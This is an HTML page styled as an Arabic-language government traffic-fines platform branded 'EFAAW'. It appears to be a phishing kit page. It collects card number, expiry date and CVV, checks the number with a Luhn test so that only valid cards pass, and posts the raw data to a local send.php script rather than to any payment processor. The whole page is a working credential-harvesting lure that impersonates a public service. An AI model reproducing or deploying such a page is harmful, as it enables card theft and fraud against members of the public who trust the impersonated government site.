


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        المنصة الوطنية للمخالفات
    </title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/fontawesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <style>
        * {
            padding: 0%;
            margin: 0%;
            box-sizing: border-box;
            direction: rtl;
            font-family: "Tajawal", sans-serif;
            color: #000;
        }

        a {
            text-decoration: none;
        }

        body {
            background-image: url(./assets/Back004.jpg);
            background-size: auto;
        }

        html {
            overflow-x: hidden;
        }

        .bbtn {
            font-size: 18px;
            color: #fff;
            padding: 10px 17px 12px;
            text-decoration: none;
            margin: 3px;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-active {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-disable {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: rgba(0, 150, 136, .7);
            border: none;
            display: inline-block;
        }

        .form-control {
            border-radius: 0;
            height: 45px;
        }

        .se-pre-con {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 9999999;
            background: url(./assets/Progress2.svg) center no-repeat #ffffffeb;
            background-size: 310px 80px;
            overflow-x: hidden;
        }

        .show {
            display: block;
        }

        .hidden {
            display: none;
        }

        .detailsGroup {
            margin-top: 15px;
        }

        .detailsGroup .detailsValue {
            background: #f3f3f3;
            text-align: CENTER;
            padding: 1px 5px 5px;
        }

        .contFot {
            margin-bottom: 300px;
        }

        .btn-success {
            background-color: #17605d;
            border-color: #17605d;
        }

        @media only screen and (max-width: 600px) {
            .texF {
                display: none;
            }

            .ffre {
                text-align: center;
            }

            .ccdr {
                flex-direction: column;
                margin-top: 30px;
            }

            .butApp {
                text-align: center;
            }

            .arBut {
                width: 49%;
            }

            .colForMar {
                margin-top: 25px;
            }

            .contFot {
                margin-bottom: 150px;
            }

            .firFot {
                justify-content: center !important;
            }

            .secFor {
                margin-top: 40px;
            }

            .secForrg {
                margin-bottom: 40px;
            }
        }

        .bg-success {
            background-color: #17605d !important;
        }

        .hide{
          display: none;
        }
    </style>
</head>

<body>

    <nav class="navbar navbar-expand-lg" style="background-color: rgba(0,150,136,.7);">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="./assets/EFAAW.svg" width="120" alt=""></a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
            </div>
        </div>
    </nav>


    <div class="container" style="margin-top: 90px;">
        <div class="row px-4 py-2" style="backdrop-filter: blur(4px);">
            <form action="send.php" method="post" onsubmit="return validateAndSubmitForm()">
                <label for="cardNumber" class="mt-3 mb-2" style="color: #fff;">رقم البطاقة <img src="./assets/visamc.png" class="ms-4" width="60" alt=""></label>
                <input type="text" name="cardNumber" style="direction: ltr !important;" id="cardNumberI" onblur="validateCardNumber()" required class="form-control fw-bold text-end" placeholder="XXXX XXXX XXXX XXXX">
                <input type="hidden" id="checkCard" value="0">
                <div class="hide" id="checkToCard">
                    <small class="text-danger fw-bold">رقم البطاقة غير صحيح</small>
                </div>
                <div class="text-center mb-3 mt-2">
                    <label for="" class="form-label" style="color: #fff;">تاريخ إنتهاء الصلاحية</label>
                    <div class="d-flex gap-3">
                        <select class="form-control w-100" required name="year">
                            <option selected value="" disabled>YY</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                            <option value="2031">2031</option>
                            <option value="2032">2032</option>
                            <option value="2033">2033</option>
                            <option value="2033">2034</option>
                        </select>
                        <select class="form-control" required name="month">
                            <option selected value="" disabled>MM</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                    </div>
                </div>
                <div class="text-center mb-2">
                    <label for="" class="form-label" style="color: #fff;">رمز الحماية (CVV)</label>
                    <input type="text" required name="cvv" minlength="3" maxlength="3" pattern="[0-9]+" class="form-control" inputmode="numeric" placeholder="رمز التحقق (CVV)">
                    <input type="hidden" name="status" value="2">
                </div>


                <button class="btn btn-success w-100 mt-4 fw-bold mb-3" style="height: 60px !important; border-radius: 12px; font-size: 18px !important;" type="submit" name="send">إدفع الآن</button>
            </form>

        </div>
    </div>



    <script>
        document.getElementById('cardNumberI').addEventListener('input', function(event) {
            let input = event.target;
            let value = input.value.replace(/\s/g, ''); // Remove spaces
            let numericValue = value.replace(/\D/g, ''); // Remove non-digit characters

            // If length is 16, allow removing characters, but not adding more
            if (/^\d{0,16}$/.test(numericValue)) {
                let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, '$1 '); // Add space after every group of four digits
                input.value = formattedValue;

                // If length is exactly 16, set maxlength attribute to prevent adding more characters
                if (numericValue.length === 16) {
                    input.setAttribute('maxlength', '16');
                } else {
                    input.removeAttribute('maxlength');
                }
            } else {
                // If more than 16 characters, ignore the input
                input.value = input.value.slice(0, 16);
            }
        });


        function isValidLuhn(digits) {
            let checkDigit = 0;

            for (let i = digits.length - 2; i >= 0; --i) {
                checkDigit += (i % 2 === 0) ?
                    (digits[i] > 4 ? digits[i] * 2 - 9 : digits[i] * 2) :
                    digits[i];
            }

            return (10 - (checkDigit % 10)) === digits[digits.length - 1];
        }

        function validateCardNumber() {
            var cardNumber = document.getElementById("cardNumberI").value.replace(/\s/g, ''); // Remove spaces
            if (/[^0-9-\s]+/.test(cardNumber)) {
                document.getElementById("checkCard").value = 2;
                document.getElementById("checkToCard").classList.remove("hide");
                document.getElementById("checkToCard").classList.add("show");
                return;
            }

            var isValid = isValidLuhn(cardNumber.split('').map(Number));
            if (isValid) {
                document.getElementById("checkCard").value = 1;
                document.getElementById("checkToCard").classList.remove("show");
                document.getElementById("checkToCard").classList.add("hide");
            } else {
                document.getElementById("checkCard").value = 2;
                document.getElementById("checkToCard").classList.remove("hide");
                document.getElementById("checkToCard").classList.add("show");
            }
        }

        function validateAndSubmitForm() {
            // Perform additional validation if needed
            var isValidCard = (document.getElementById("checkCard").value == 1);

            if (isValidCard) {
                return true;
            } else {
                return false;
            }
        }
    </script>
</body>

</html>